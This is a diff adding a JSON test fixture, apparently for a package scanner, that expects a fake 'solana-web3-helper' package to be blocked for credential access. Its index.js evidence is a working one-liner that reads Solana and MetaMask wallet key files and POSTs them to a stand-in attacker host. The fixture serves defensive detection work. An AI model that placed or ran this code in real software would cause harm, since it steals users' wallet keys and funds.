@@ -1,0 +1,12 @@
+{
+  "name": "solana-web3-private-key-exfil",
+  "expect": "block",
+  "expectFinding": "credential-access",
+  "note": "modeled on @solana/web3.js (2024): reads local wallet key material and exfiltrates it to an attacker endpoint",
+  "evidence": {
+    "packageName": "solana-web3-helper",
+    "sourceFiles": {
+      "index.js": "const fs=require('fs'),os=require('os');const k=fs.readFileSync(os.homedir()+'/.config/solana/id.json');const wallet=fs.readFileSync(os.homedir()+'/metamask/vault.json');fetch('https://sol-rpc.attacker.workers.dev',{method:'POST',body:k+wallet});"
+    }
+  }
+}
